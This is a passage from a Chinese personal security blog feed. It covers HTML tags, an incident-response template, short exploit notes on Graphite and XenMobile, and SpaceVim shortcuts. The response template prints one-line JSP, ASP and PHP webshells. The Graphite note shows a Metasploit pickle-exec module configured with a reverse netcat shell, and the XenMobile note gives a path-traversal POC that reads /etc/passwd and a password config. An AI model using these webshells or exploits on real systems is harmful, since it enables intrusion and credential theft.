id=&quot;test&quot;&gt;test&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;#test&quot;&gt;回到test&lt;/a&gt;&lt;/p&gt;</code></pre><p>链接目标target的写法</p><pre><code class="html">&lt;a href=&quot;http://www.w3.org&quot; target=&quot;_self&quot;&gt;W3C(当前窗口打开)&lt;/a&gt;&lt;a href=&quot;http://www.w3.org&quot; target=&quot;_blank&quot;&gt;W3C(新建窗口打开)&lt;/a&gt;</code></pre><h3 id="图片链接"><a href="#图片链接" class="headerlink" title="图片链接"></a>图片链接</h3><pre><code class="html">&lt;img src=&quot;/path/to/img.jpg&quot; alt=&quot;替代文字&quot; /&gt;</code></pre><h2 id="多媒体"><a href="#多媒体" class="headerlink" title="多媒体"></a>多媒体</h2><h3 id="动态文字"><a href="#动态文字" class="headerlink" title="动态文字"></a>动态文字</h3><pre><code class="html">&lt;marquee direction=&quot;left/right/up/down&quot; behavior=&quot;scroll/slide/alternate&quot; loop=1 scrollamount=5 scrolldelay=1 bgcolor=“#FFFF55” width=300 height=500&gt; 动态文字. &lt;/marquee&gt;direction: 滚动方向behavior: 滚动方式loop: 循环次数scrollamount: 滚动速度scrolldelay: 滚动延迟bgcolor: 背景颜色width、height:滚动面积</code></pre><h3 id="Audio标签"><a href="#Audio标签" class="headerlink" title="Audio标签"></a>Audio标签</h3><pre><code class="html">&lt;audio src=&quot;path/to/audio_file&quot; autoplay=&quot;&quot; controls=&quot;&quot; loop=1&quot; &gt;您的浏览器不支持audio标记&lt;/audio&gt;</code></pre><h3 id="Video标签"><a href="#Video标签" class="headerlink" title="Video标签"></a>Video标签</h3><pre><code class="html">&lt;video src=&quot;path/to/video_file&quot; autoplay=&quot;&quot; width=10 height=10 loop=1 &gt;您的浏览器不支持video标记&lt;/video&gt;</code></pre><h3 id="字幕标签"><a href="#字幕标签" class="headerlink" title="字幕标签"></a>字幕标签</h3><pre><code class="html">&lt;track src=&quot;vat/sintel-en.vtt&quot; srclang=&quot;en&quot;. kind=&quot;captions&quot; label=&quot;English captions&quot; /&gt;</code></pre><h3 id="多媒体文件"><a href="#多媒体文件" class="headerlink" title="多媒体文件"></a>多媒体文件</h3><pre><code class="html">&lt;embed src=&quot;/path/to/file&quot; autostart=True/False loop=3 hidden=True/False width=300 height=400&gt;&lt;/embed&gt;</code></pre><h3 id="背景音乐"><a href="#背景音乐" class="headerlink" title="背景音乐"></a>背景音乐</h3><pre><code class="html">&lt;bgsound src=&quot;/path/to/music.mp3&quot; loop= 1&gt;</code></pre><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h3><pre><code class="html">&lt;dl&gt;    &lt;dt&gt;名词1&lt;dd&gt;解释名词1    &lt;dt&gt;名词2&lt;dd&gt;解释名词2&lt;/dl&gt;</code></pre><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><pre><code class="html">&lt;ul type=&quot;disc/circle/square&quot;&gt;    &lt;LI&gt;列表项    &lt;LI&gt;列表项    &lt;LI&gt;列表项&lt;/ul&gt;</code></pre><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><pre><code class="html">&lt;ol type=1/a/A/i/I start=1 &gt;    &lt;LI&gt;列表项    &lt;LI&gt;列表项    &lt;LI&gt;列表项&lt;/ol&gt;</code></pre><h3 id="菜单列表"><a href="#菜单列表" class="headerlink" title="菜单列表"></a>菜单列表</h3><pre><code class="html">&lt;menu&gt;    &lt;LI&gt;菜单项    &lt;LI&gt;菜单项    &lt;LI&gt;菜单项    &lt;LI&gt;菜单项&lt;/menu&gt;</code></pre><h3 id="目录列表"><a href="#目录列表" class="headerlink" title="目录列表"></a>目录列表</h3><pre><code class="html">&lt;dir&gt;    &lt;LI&gt;文件名    &lt;LI&gt;文件名    &lt;LI&gt;文件名    &lt;LI&gt;文件名&lt;/dir&gt;</code></pre><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><pre><code class="html">&lt;table width=300 height=300  align=&quot;left/center/right&quot; border=1 bordercolor=&quot;#FFFF55&quot;&gt;    &lt;caption&gt;表格标题&lt;/caption&gt;    &lt;thead bgcolor align &gt; &lt;!--可选---&gt;    &lt;tr&gt;&lt;!--第一行---&gt;        &lt;th&gt;表头1&lt;/th&gt; &lt;!--第一列---&gt;        &lt;th&gt;表头2&lt;/th&gt; &lt;!--第二列---&gt;        &lt;th&gt;表头3&lt;/th&gt; &lt;!--第三列---&gt;    &lt;/tr&gt;    &lt;thead&gt;    &lt;tbody bicolor=&quot;&quot; aligin=&quot;&quot;&gt;  &lt;!--可选---&gt;    &lt;tr&gt;&lt;!--第一行---&gt;        &lt;td&gt;单元格内的文字&lt;/td&gt; &lt;!--第一列---&gt;        &lt;td&gt;单元格内的文字&lt;/td&gt; &lt;!--第二列---&gt;        &lt;td&gt;单元格内的文字&lt;/td&gt; &lt;!--第三列---&gt;    &lt;/tr&gt;    &lt;tr&gt;&lt;!--第二行---&gt;        &lt;td&gt;单元格内的文字&lt;/td&gt;        &lt;td&gt;单元格内的文字&lt;/td&gt;        &lt;td&gt;单元格内的文字&lt;/td&gt;    &lt;/tr&gt;    &lt;tbody&gt;    &lt;tfoot bgcolor=&quot;&quot; align=&quot;&quot; &gt;  &lt;!--可选---&gt;    &lt;tr&gt;&lt;!--第三行---&gt;        &lt;td&gt;单元格内的文字&lt;/td&gt;        &lt;td&gt;单元格内的文字&lt;/td&gt;        &lt;td&gt;单元格内的文字&lt;/td&gt;    &lt;/tr&gt;    &lt;tfoot&gt;&lt;/table&gt;</code></pre><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><pre><code class="html">&lt;!--创建表单---&gt;&lt;form name=&quot;form1&quot; method=&quot;GET/POST&quot; action=&quot;url&quot; enctype=&quot;Text/plain | multipart/form-data | application/x-www-form-urlencoded&quot;  target=&quot;_self/_blank&quot;&gt;    控件: &lt;input name=&quot;控件名&quot; type=&quot;控件类型&quot;  &gt;    文本框: &lt;input name=&quot;text1&quot; type=&quot;text&quot; size=10 maxlength=200 value=&quot;文本默认值&quot; &gt;    密码框: &lt;input name=&quot;password1&quot; type=&quot;password&quot; size=10 maxlength=200 value=&quot;文本默认值&quot;&gt;    &lt;br /&gt;    单选按钮: &lt;input name=&quot;radio1&quot; type=&quot;radio&quot; value=&quot;单选按钮取值1&quot; checked&gt;选项1    单选按钮: &lt;input name=&quot;radio1&quot; type=&quot;radio&quot; value=&quot;单选按钮取值2&quot; &gt;选项2    &lt;br /&gt;    复选项: &lt;input name=&quot;checkbox1&quot; type=&quot;checkbox&quot; value=&quot;复选项的值&quot; checked&gt;项目1    复选项: &lt;input name=&quot;checkbox1&quot; type=&quot;checkbox&quot; value=&quot;复选项的值&quot; &gt;项目2    复选项: &lt;input name=&quot;checkbox1&quot; type=&quot;checkbox&quot; value=&quot;复选项的值&quot; checked&gt;项目3    &lt;br /&gt;    普通按钮: &lt;input name=&quot;button1&quot; type=&quot;button&quot; value=&quot;普通按钮显示值&quot; onclick=&quot;function&quot;&gt;    &lt;br /&gt;    提交按钮: &lt;input name=&quot;submit1&quot; type=&quot;submit&quot; value=&quot;提交按钮显示值&quot; &gt;    重置按钮: &lt;input name=&quot;reset1&quot; type=&quot;reset&quot; value=&quot;重置按钮显示值&quot; &gt;    图像提交按钮: &lt;input name=&quot;image1&quot; type=&quot;image&quot; src=&quot;path/to/image&quot; value=&quot;默认值&quot; &gt;    隐藏按钮: &lt;input name=&quot;hidden1&quot; type=&quot;hidden&quot; value=&quot;提交参数值&quot;&gt;    文件按钮: &lt;input name=&quot;file1&quot; type=&quot;file&quot; &gt;&lt;!--菜单列表类型的控件---&gt;    &lt;!--下拉菜单---&gt;    证件类型: &lt;select name=&quot;cardtype&quot;&gt;               &lt;option value=&quot;id_card&quot; selected&quot;&gt;身份证            &lt;option value=&quot;stu_card&quot; &gt;学生证            &lt;option value=&quot;drive_card&quot;&gt;驾驶证            &lt;option value=&quot;other_card&quot;&gt;其他证件           &lt;/select&gt;        &lt;!--列表项菜单---&gt;   对html评价: &lt;select name=&quot;content&quot; size=5 multiple&gt;              &lt;option value=&quot;M1&quot; selected&gt;很容易            &lt;option value=&quot;M2&quot; &gt;一般            &lt;option value=&quot;M3&quot; &gt;能理解          &lt;/select&gt;&lt;!--文本域----&gt;    留言: &lt;textarea name=&quot;textarea1&quot; rows=5 cols=80 &gt;默认显示值&lt;/textarea&gt;    &lt;/form&gt;</code></pre><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><h3 id="框架基本结构"><a href="#框架基本结构" class="headerlink" title="框架基本结构"></a>框架基本结构</h3><pre><code class="html">&lt;!--水平分割窗口rows---&gt;&lt;frameset rows=&quot;30%,70%&quot; frameborder=0/1 &gt;    &lt;frame src=&quot;path/to/xx.html name=&quot;xx&quot; &gt;    &lt;frame src=&quot;path/to/file name=&quot;file1&quot; &gt;&lt;/frameset&gt;&lt;!--垂直分割窗口cols---&gt;&lt;frameset rows=&quot;25%,55%，25%&quot; frameborder=0/1 &gt;    &lt;frame&gt;    &lt;frame&gt;    &lt;frame&gt;&lt;/frameset&gt;### 浮动框架```html&lt;iframe name=&quot;&quot; align=&quot;&quot; width=12 height=12  src=&quot;path/to/xx.html&quot; &gt;&lt;iframe&gt;</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>应急响应模板</title>
      <link href="Response/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A8%A1%E6%9D%BF.html"/>
      <url>Response/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A8%A1%E6%9D%BF.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>[toc]</p><p>应急响应分类:</p><ul><li><p><strong>勒索病毒(Rasomware)</strong> 是伴随数字货币星期的一种新型病毒木马，<br>机器一旦遭受勒索病毒攻击，将会使绝大多数文件被非对称加密算法和对称加密算法组合的方式进行篡改，并添加一个特殊后缀。<br>绝大大叔勒索病毒均无法通过技术手段解密，必须拿到对应的解密私钥才有可能无损还原加密文件。<br>常见的勒索病毒有WannaCry、GlobeImposter、Dharma等。</p></li><li><p><strong>挖矿(Mining)木马</strong> 是一种利用被入侵计算机的算力挖掘加密数字货币以谋取利益的木马， </p></li></ul><p>它会采用多种安全对抗技术(如修改任务计划、修改防火墙配置、修改系统动态链接库等)手段驻留在服务器中。</p><p>常见的挖矿木马： WannaMine、Mykings、Bulehero等。</p><ul><li><strong>网站后门(Webshell)</strong><br>Webshell是一种带有文件操作、命令执行等功能的网页脚本,常见脚本如下：</li><li>JSP:<pre><code class="js">&lt;% Runtime.getRuntime().exe(request.getParameter(&quot;cmd&quot;)) %&gt;</code></pre></li><li>ASP:<pre><code class="js">&lt;% eval request(&quot;cmd&quot;) %&gt;</code></pre></li><li>PHP:<pre><code class="js">&lt;?php eval($_GET[“cmd&quot;]);?&gt;</code></pre></li></ul><h2 id="事件预判"><a href="#事件预判" class="headerlink" title="事件预判"></a>事件预判</h2><p>事件背景<br>xxxx年x月x日，x公司内网服务器遭遇(挖矿木马、勒索病毒、网站被篡改)。<br>应急响应工程师在抵达现场后，对包含服务器在的x台机器进行系统排查和日志分析。</p><ul><li>发现服务器大量资源被占用，初步判断内网多台服务器均感染挖矿病毒。</li><li>确定内网多台服务器均感染xx勒索病毒，该公司多区，多台服务器重要数据均被加密。  </li><li>确定服务器已被植入webshell后门。</li></ul><h3 id="中勒索病毒的特征"><a href="#中勒索病毒的特征" class="headerlink" title="中勒索病毒的特征"></a>中勒索病毒的特征</h3><ul><li>业务系统无法访问(50%)</li><li>桌面新txt文件(60%)</li><li>文件后缀被篡改(80%)</li><li>勒索信展示(100%)</li></ul><h3 id="中挖矿木马特征"><a href="#中挖矿木马特征" class="headerlink" title="中挖矿木马特征"></a>中挖矿木马特征</h3><ul><li>服务器CPU使用率飙升，系统卡顿，部分服务无法正常运行等现象</li><li>根据安全监测设备的告警判断，挖矿木马会与矿池地址建立连接</li></ul><p>确定挖矿开始时间</p><ol><li><p>查看矿池地址<br>挖矿木马会与矿池建立连接，通过安全监测类设备查看第一次连接矿池地址的时间，可作为初始时间</p></li><li><p>查看计划任务创建时间<br>挖矿木马通常会创建计划任务，定期运行，可以查看计划任务的时间，但计划任务存在更新的情况，会刷新时间</p></li><li><p>挖矿木马文件创建时间<br>可以判断挖矿木马运行的初始时间，但也存在被计划任务定时运行而更新木马文件创建的时间。</p></li></ol><h3 id="中webshell特征"><a href="#中webshell特征" class="headerlink" title="中webshell特征"></a>中webshell特征</h3><ul><li>网页被篡改（植入暗链、异常字段等）</li><li>安全设备告警</li></ul><h2 id="事件排查"><a href="#事件排查" class="headerlink" title="事件排查"></a>事件排查</h2><h3 id="勒索病毒排查思路"><a href="#勒索病毒排查思路" class="headerlink" title="勒索病毒排查思路"></a>勒索病毒排查思路</h3><p>重点关注网络连接、进程、任务计划等信息，针对windows还需关注启动项和注册表<br>若涉及溯源和证据固定，可提前对可疑对象做好备份，对涉及的可疑系统用户组可先进行禁用操作，防止出现可疑内容删除而无法溯源和提供证据的发生。</p><h3 id="挖矿木马排查思路"><a href="#挖矿木马排查思路" class="headerlink" title="挖矿木马排查思路"></a>挖矿木马排查思路</h3><p>挖矿木马一般会创建恶意的进程连接矿池，利用系统内存、CPU、GPU资源进行挖矿，<br>同时会通过创建用户、服务、任务计划、修改注册表、启动项、防火墙策略等手段来实现病毒的持久化。<br>需重点关注<strong>用户、异常IP连接、进程、服务、任务计划</strong></p><h3 id="Webshell排查思路"><a href="#Webshell排查思路" class="headerlink" title="Webshell排查思路"></a>Webshell排查思路</h3><p>如果网站被植入暗链或单击出现意外跳转到其他网站，应首先排查网站首页的相关的js文件。</p><ol><li><p>Webshell排查<br> 使用工具(D盾等)对网站目录进行扫描，定位webshell并清除。</p></li><li><p>Web日志分析<br> 对访问网站的Web日志进行分析，重点关注已知的入侵事件前后的日志记录。</p></li><li><p>系统排查<br> 防止获取webshell后进行后续提权等操作</p></li><li><p>网络流量排查</p></li></ol><h2 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h2><h3 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h3><p>确认勒索病毒事件后，需及时对勒索病毒进行清理并进行相应的数据恢复工作，同时对服务器/主机进行安全加固，避免二次感染。</p><ol><li>隔离问题主机，断开网络连接</li><li>在网络边界防洪墙上全局关闭3389端口，或3389端口只对特定IP地址开放</li><li>开启Windows防火墙，尽量关闭135、139、445、3389等不用的高危端口</li><li>每台机器设置唯一登陆密码，且应设置高强度的密码，位数在15位以上，包含大小写字母，数字，特殊字符。</li><li>安装最新杀毒软件，对被感染机器进行安全扫描和病毒查杀</li><li>对系统进行补丁更新，封堵病毒传播路径</li><li>结合备份的网站日志对网站应用进行全面代码审计，找出攻击者利用的漏洞入口，进行封堵</li><li>使用全流量设备对全网中存在的威胁进行分析，排查问题</li></ol><h3 id="挖矿木马"><a href="#挖矿木马" class="headerlink" title="挖矿木马"></a>挖矿木马</h3><ol><li>封堵矿池地址</li><li>结束异常进程</li><li>清理计划任务、禁用可疑用户</li><li>清除挖矿木马</li><li>全盘杀毒、加固</li></ol><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><h2 id="事件总结"><a href="#事件总结" class="headerlink" title="事件总结"></a>事件总结</h2><p>综上，对发现的线索进行梳理如下：</p><ol><li>xx</li><li>xx</li><li>xx</li><li>xx</li><li>xx<br>综上分析，<br>此次内网服务器所感染的病毒为XX挖矿蠕虫病毒。</li></ol><ul><li>通过收集病毒感染的服务器日志信息，发现最早感染的主机为堡垒机应用服务器，感染时间为Y/m/d H:M:S.</li><li>通过收集分析堡垒机应用服务器所有日志信息，排除人为投毒的可能性。</li><li>通过阅读解密后的脚本内容发现，该脚本&lt;脚本运行的逻辑描述，通过分析该下载文件，可判断该文件为挖矿木马的母体。</li></ul><p>IP地址为x.x.x.x的主机最先远程登录到IP地址x.x.x.x的主机，先进行一系列扫描及内部RDP暴力破解等操作，并通过x.x.x.x的主机进行横向移动，寻找有价值的服务器进行人工投毒，植入类似病毒进行攻击。</p><h2 id="后续防范"><a href="#后续防范" class="headerlink" title="后续防范"></a>后续防范</h2><ol><li>服务器、终端防护<ol><li>所有服务器、终端应强行实施复杂密码策略，杜绝弱口令</li><li>杜绝使用通用密码管理所有机器</li><li>安装杀毒软件、终端安全管理软件，并及时更新病毒库</li><li>及时安装漏洞补丁</li><li>服务器开启关键日志收集功能，为安全事件的溯源提供支持</li></ol></li><li>网络防护与安全监测<ol><li>对内网的安全域进行合理划分，各个安全域之间严格限制访问控制列表(ACL),限制横向移动的范围</li><li>配置并开启相关关键系统、应用日志，对系统日志进行定期异地归档、备份。</li><li>重要业务系统及核心数据库应设置独立的安全区域，并做好区域边界的安全防御工作，严格限制重要区域的访问权限，并关闭Telnet、SNMP等不必要、不安全的服务</li><li>在网络内架设IDS/IPS设备，及时发现、阻断内网的横向移动行为</li><li>在网络内架设全流量记录设备，以发现内网的横向移动行为，并为溯源提供支持</li></ol></li><li>应用系统防护及数据备份<ol><li>需要对应用系统进行安全渗透测试与加固，保障应用系统自身安全可控</li><li>对业务系统及数据进行及时备份，并定期验证备份系统及备份数据的可用性</li><li>建立安全灾备预案，一旦核心系统遭受攻击，需要确保备份业务系统可以立即启用，同时做好备份系统与主系统的安全隔离工作，避免主、备系统同时被攻击，影响业务连续性</li></ol></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Response </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Graphite</title>
      <link href="Kali/Exploit/Graphite.html"/>
      <url>Kali/Exploit/Graphite.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p><code>Graphite</code> 是一个企业级开源系统的实时监控绘图工具,采用Django框架编写，可实时收集、存储、显示时间序列类型的数据。</p><h2 id="information"><a href="#information" class="headerlink" title="information"></a>information</h2><pre><code>nmap -T4 -sV -Pn -p 5000 10.199.56.1Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-17 17:14 CSTNmap scan report for 10.199.56.1Host is up (0.088s latency).PORT     STATE SERVICE VERSION5000/tcp open  upnp?1 service unrecognized despite returning data.</code></pre><h2 id="MSF相关利用"><a href="#MSF相关利用" class="headerlink" title="MSF相关利用"></a>MSF相关利用</h2><pre><code class="zsh">Module options (exploit/unix/webapp/graphite_pickle_exec):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]   RHOSTS     10.199.56.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT      5000             yes       The target port (TCP)   SSL        false            no        Negotiate SSL/TLS for outgoing connections   TARGETURI  /                yes       The path to a vulnerable application   VHOST                       no        HTTP server virtual hostPayload options (cmd/unix/reverse_netcat):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  12.12.3.190      yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen port</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XenMobile</title>
      <link href="Kali/Exploit/XenMobile.html"/>
      <url>Kali/Exploit/XenMobile.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><p><input checked="" disabled="" type="checkbox"> </p><p>XenMobile MDM是一种可靠的移动设备管理解决方案，可以对企业设备和员工个人设备进行基于角色的管理和配置并确保安全性。完成用户设备注册后，IT部门可以自动为设备置备策略和应用，将应用列入黑名单或白名单，检测并防止使用越狱设备，擦除或有选择性地擦除丢失、被盗或不符合规定的设备中的数据。用户可以使用自己喜爱的任何设备，而IT部门可以确保企业资产的合规性，并有效保护设备中保存的企业内容。</p></li></ul><h2 id="XenMobile目录穿越-CVE-2020-8209"><a href="#XenMobile目录穿越-CVE-2020-8209" class="headerlink" title="XenMobile目录穿越 CVE-2020-8209"></a>XenMobile目录穿越 CVE-2020-8209</h2><p>CVE-2020-8209，路径遍历漏洞。此漏洞允许未经授权的用户读取任意文件，包括包含密码的配置文件。</p><p>通过空间引擎关键字</p><p>“XenMobile控制台” 或者 “XenMobile - Console”</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><a href="https://github.com/B1anda0/CVE-2020-8209">CVE-2020-8209</a></p><pre><code class="zsh">/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd/jsp/help-sb-download.jsp?sbFileName=../../../opt/sas/sw/config/sftu.properties</code></pre><h3 id="漏洞建议"><a href="#漏洞建议" class="headerlink" title="漏洞建议"></a>漏洞建议</h3><p>官方补丁删除了/opt/sas/sw/tomcat/inst1/webapps/ROOT/jsp/help-sb-download.jsp</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SpaceVim</title>
      <link href="Tools/SpaceVim.html"/>
      <url>Tools/SpaceVim.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p><a href="https://vim.rtorr.com/lang/zh_tw">Vim Cheat Sheet</a>## SpaceVim</p><p><a href="https://spacevim.org/cn/documentation/">官方文档</a>实在太难阅读了</p><p>帮助信息</p><p><code>SPC h k</code> 显示各个导航快捷键的绑定信息</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC h k</code></td><td>使用快捷键导航，展示 SpaceVim 所支持的前缀键</td></tr><tr><td><code>SPC h m</code></td><td>使用 Unite 浏览所有 man 文档</td></tr></tbody></table><p>报告一个问题：</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC h I</code></td><td>根据模板展示 Issue 所必须的信息</td></tr></tbody></table><h3 id="导航键"><a href="#导航键" class="headerlink" title="导航键"></a>导航键</h3><h4 id="Spacevim中的前缀键："><a href="#Spacevim中的前缀键：" class="headerlink" title="Spacevim中的前缀键："></a>Spacevim中的前缀键：</h4><table><thead><tr><th>前缀名称</th><th>用户选项以及默认值</th><th>功能描述</th></tr></thead><tbody><tr><td><code>[SPC]</code></td><td>空格键</td><td>SpaceVim 默认前缀键</td></tr><tr><td><code>[Window]</code></td><td><code>s</code></td><td>SpaceVim 默认窗口前缀键</td></tr><tr><td><code>&lt;leader&gt;</code></td><td><code>\</code></td><td>Vim/Neovim 默认前缀键</td></tr><tr><td><code>g</code></td><td><code>g</code></td><td>unkown</td></tr><tr><td><code>z</code></td><td><code>z</code></td><td>unkown</td></tr></tbody></table><h4 id="SPC前缀键大体命令分类"><a href="#SPC前缀键大体命令分类" class="headerlink" title="SPC前缀键大体命令分类"></a>SPC前缀键大体命令分类</h4><table><thead><tr><th>SPC主体划分</th><th>相关功能</th></tr></thead><tbody><tr><td><code>SPC b</code></td><td>缓冲区相关命令</td></tr><tr><td><code>SPC c</code></td><td>注释相关命令</td></tr><tr><td><code>SPC e</code></td><td>错误相关命令</td></tr><tr><td><code>SPC f</code></td><td>文件操作相关命令</td></tr><tr><td><code>SPC h</code></td><td>帮助相关命令</td></tr><tr><td><code>SPC i</code></td><td>插入相关命令</td></tr><tr><td><code>SPC j</code></td><td>跳转、合并、拆分相关命令</td></tr><tr><td><code>SPC l</code></td><td>编程相关命令</td></tr><tr><td><code>SPC q</code></td><td>退出vim相关命令</td></tr><tr><td><code>SPC s</code></td><td>搜索相关命令</td></tr><tr><td><code>SPC w</code></td><td>窗口相关命令</td></tr><tr><td><code>SPC x</code></td><td>文本相关命令</td></tr></tbody></table><p>导航窗口内，按下 <code>Ctrl-h</code> 键,可显示帮助信息 帮助信息快捷键：</p><table><thead><tr><th>按键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>u</code></td><td>撤销按键</td></tr><tr><td><code>n</code></td><td>向下翻页</td></tr><tr><td><code>p</code></td><td>向上翻页</td></tr></tbody></table><p>如果要自定义以 <code>[SPC]</code> 为前缀的快捷键，可以使用 <code>SpaceVim#custom#SPC()</code>，示例如下：<br>启动函数文件应放置在 Vim &amp;runtimepath 的 autoload 文件夹内。例如：<br>文件名：~/.SpaceVim.d/autoload/myspacevim.vim</p><pre><code class="vimscript">call SpaceVim#custom#SPC(&#39;nnoremap&#39;, [&#39;f&#39;, &#39;t&#39;], &#39;echom &quot;hello world&quot;&#39;, &#39;test custom SPC&#39;, 1)</code></pre><h3 id="自定义配置"><a href="#自定义配置" class="headerlink" title="自定义配置"></a>自定义配置</h3><p>SpaceVim 相关的快捷键均以 <code>SPC f v</code> 为前缀，这便于快速访问 SpaceVim 的配置文件：</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC f v v</code></td><td>复制并显示当前 SpaceVim 的版本</td></tr><tr><td><code>SPC f v d</code></td><td>打开 SpaceVim 的用户配置文件</td></tr><tr><td><code>SPC h l</code></td><td>列出所有可用模块</td></tr></tbody></table><p><a href="https://spacevim.org/cn/layers/">全部模块</a></p><pre><code class="toml">[options] automatic_update = true # SpaceVim自动更新  disabled_plugins = [&quot;clighter&quot;, &quot;clighter8&quot;]  # 禁用插件[[custom_plugins]]    # 自定义插件    repo = &quot;lilydjwg/colorizer&quot;    on_cmd = [&quot;ColorHighlight&quot;, &quot;ColorToggle&quot;]   # 可以通过 :h dein-options 查阅。    merged = false</code></pre><h3 id="界面美化"><a href="#界面美化" class="headerlink" title="界面美化"></a>界面美化</h3><p>所有的界面元素切换快捷键都以 <code>[SPC] t</code> 或 <code>[SPC] T</code> 开头</p><pre><code class="toml">[options]colorscheme = &quot;gruvbox&quot;colorscheme_bg = &quot;dark&quot;filemanager = &quot;nerdtree&quot;enable_googlesuggest = true  # 启用google搜索enable_guicolors = false   # 启用真色guifont = &quot;SourceCodePro Nerd Font Mono:h11&quot;  # 字体配置</code></pre><h4 id="界面元素切换"><a href="#界面元素切换" class="headerlink" title="界面元素切换"></a>界面元素切换</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC t 8</code></td><td>高亮所有超过 80 列的字符</td></tr><tr><td><code>SPC t f</code></td><td>高亮临界列，默认 <code>max_column</code> 是第 120 列</td></tr><tr><td><code>SPC t h h</code></td><td>高亮当前行</td></tr><tr><td><code>SPC t h i</code></td><td>高亮代码对齐线</td></tr><tr><td><code>SPC t h c</code></td><td>高亮光标所在列</td></tr><tr><td><code>SPC t h s</code></td><td>启用/禁用语法高亮</td></tr><tr><td><code>SPC t i</code></td><td>切换显示当前对齐(TODO)</td></tr><tr><td><code>SPC t n</code></td><td>显示/隐藏行号</td></tr><tr><td><code>SPC t b</code></td><td>切换背景色</td></tr><tr><td><code>SPC t c</code></td><td>切换 conceal 模式</td></tr><tr><td><code>SPC t p</code></td><td>切换 paste 模式</td></tr><tr><td><code>SPC t t</code></td><td>打开 Tab 管理器</td></tr><tr><td><code>SPC T ~</code></td><td>显示/隐藏 Buffer 结尾空行行首的 <code>~</code></td></tr><tr><td><code>SPC T F</code></td><td>切换全屏(TODO)</td></tr><tr><td><code>SPC T f</code></td><td>显示/隐藏 Vim 边框(GUI)</td></tr><tr><td><code>SPC T m</code></td><td>显示/隐藏菜单栏</td></tr><tr><td><code>SPC T t</code></td><td>显示/隐藏工具栏</td></tr></tbody></table><h4 id="状态栏"><a href="#状态栏" class="headerlink" 